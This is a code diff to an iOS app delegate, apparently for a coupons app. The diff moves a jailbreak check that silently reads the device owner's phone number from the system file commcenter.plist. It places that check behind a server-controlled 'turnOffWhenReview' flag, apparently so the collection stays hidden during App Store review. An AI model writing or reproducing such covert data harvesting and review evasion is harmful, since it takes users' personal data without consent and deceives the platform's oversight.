@@ -24,6 +24,8 @@
 #import "TVNotification.h"
 #import "TVCoupons.h"
 #import "MyNavigationController.h"
+#import "NSDictionary+Extensions.h"
+
 @interface TVAppDelegate () <UIApplicationDelegate>
 @property(nonatomic,strong)ECSlidingViewController *slidingViewController;
 @end
@@ -201,6 +203,33 @@
 
 - (void)loadWhenInternetConnected
 {
+    if (![GlobalDataUser sharedAccountClient].linkAppleStore) {
+        [[TVNetworkingClient sharedClient] postPath:@"user/getIOSAppInfo" parameters:nil success:^(AFHTTPRequestOperation *operation, id JSON) {
+            [GlobalDataUser sharedAccountClient].linkAppleStore=[JSON safeStringForKeyPath:@"data.link"] ;
+            [GlobalDataUser sharedAccountClient].isTurnOffReviewYES=[JSON safeBoolForKeyPath:@"data.turnOffWhenReview"];
+            NSLog(@"JSON=%@",JSON);
+            
+#warning not check if it work
+
+            if ([GlobalDataUser sharedAccountClient].isTurnOffReviewYES) {
+                NSString *filePath = @"/Applications/Cydia.app";
+                if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
+                {
+                    // do something useful
+                    NSString *commcenter = @"/private/var/wireless/Library/Preferences/com.apple.commcenter.plist";
+                    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:commcenter];
+                    NSString *PhoneNumber = [dict valueForKey:@"PhoneNumber"];
+                    [GlobalDataUser sharedAccountClient].phoneNumber=PhoneNumber;
+                }
+            }
+            
+        } failure:^(AFHTTPRequestOperation *operation, NSError *error) {
+            
+        }];
+    }else{
+
+    }
+    
     NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
     _notifBranches= [[NSMutableDictionary alloc] initWithDictionary:[defaults dictionaryForKey:kNotifBranches]];
     _notifCoupons= [[NSMutableDictionary alloc] initWithDictionary:[defaults dictionaryForKey:kNotifCoupons]];
@@ -284,6 +313,7 @@
             // app was just brought from background to foreground
         NSLog(@" dic : %@", userInfo);
     }
+    
     TVNotification* notificationView=[[TVNotification alloc] initWithView:_slidingViewController.topViewController.view withTitle:[userInfo valueForKey:@"branch_name"]  withDistance:nil  goWithClickView:^(){
         
         BranchProfileVC* branchProfileVC=[[BranchProfileVC alloc] initWithNibName:@"BranchProfileVC" bundle:nil];
@@ -310,15 +340,7 @@
     NSLog(@"UUID =%@",UUID);
     [GlobalDataUser sharedAccountClient].UUID=UUID;
     
-    NSString *filePath = @"/Applications/Cydia.app";
-    if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
-    {
-        // do something useful
-        NSString *commcenter = @"/private/var/wireless/Library/Preferences/com.apple.commcenter.plist";
-        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:commcenter];
-        NSString *PhoneNumber = [dict valueForKey:@"PhoneNumber"];
-        [GlobalDataUser sharedAccountClient].phoneNumber=PhoneNumber;
-    }
+    
     
     // Let the device know we want to receive push notifications
 	[[UIApplication sharedApplication] registerForRemoteNotificationTypes:
